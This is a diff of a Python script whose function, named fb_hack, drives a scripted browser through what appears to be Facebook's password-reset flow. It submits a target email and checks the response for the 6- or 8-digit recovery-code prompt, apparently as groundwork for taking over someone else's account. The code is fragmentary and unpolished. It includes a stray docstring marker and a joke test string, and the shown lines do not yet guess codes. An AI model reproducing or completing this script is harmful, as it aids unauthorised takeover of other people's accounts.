@@ -57,8 +57,6 @@ def fb_hack(email, codex):
   forms = list(browser.forms())
   form = forms[0]
   print(form)
-  """browser.form['email'] = email 
-  browser.click(coord=(364,48))
   browser.click(coord=(236,17))
   browser.form['email'] = email
   browser.submit()
@@ -66,14 +64,11 @@ def fb_hack(email, codex):
   soup = BeautifulSoup(response1, 'html.parser')
   with open("output1.html", "w") as file:
     file.write(str(soup))
-  forms = list(browser.forms())
-  form = forms[0]
-  print(form)
   browser.select_form(nr=0)
   forms = list(browser.forms())
   form = forms[0]
   print(form)
-  test = soup.find(string='poop')
+  """test = soup.find(string='poop')
   check1 = soup.find(string=("Please check your email for a message with your code. Your code is 6 numbers long."))
   soup.find(string=re.compile("Please check your email for a message with your code. Your code is 6 numbers long."))
   check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
